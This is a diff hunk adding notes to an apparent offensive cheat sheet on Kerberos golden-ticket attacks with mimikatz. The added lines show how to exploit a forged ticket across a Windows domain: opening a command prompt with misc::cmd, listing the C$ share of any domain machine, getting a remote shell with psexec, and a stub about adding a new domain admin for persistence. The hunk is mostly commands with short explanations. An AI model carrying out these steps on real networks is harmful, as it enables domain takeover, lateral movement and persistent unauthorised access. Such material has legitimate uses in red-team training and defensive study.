@@ -47,4 +47,22 @@ mimikatz # kerberos::golden /User:<USERNAME (can be real, like Administrator, or
 - /id:500 is the Administrator account's RID
 - /ptt stands for "pass the ticket"
 
+[after passing the golden ticket, one can open up a CLI and use it to interact with any machine in the domain]
+
+mimikatz # misc::cmd
+
+[a cmd prompt will open; now, you can, for example run the dir command on it against any machine in the domain]
+
+> dir \\<name_of_machine_in_the_domain>\c$
+
+[if psexec.exe (available as free download from the official Windows site) is on the machine you can use it to gain a remote shell on a machine in the domain]
+
+> psexec.exe \\<name_of_machine_in_the_domain> cmd.exe
+
+[you can also add a new admin user to the domain for persistence]
+
+
+
+
+
 
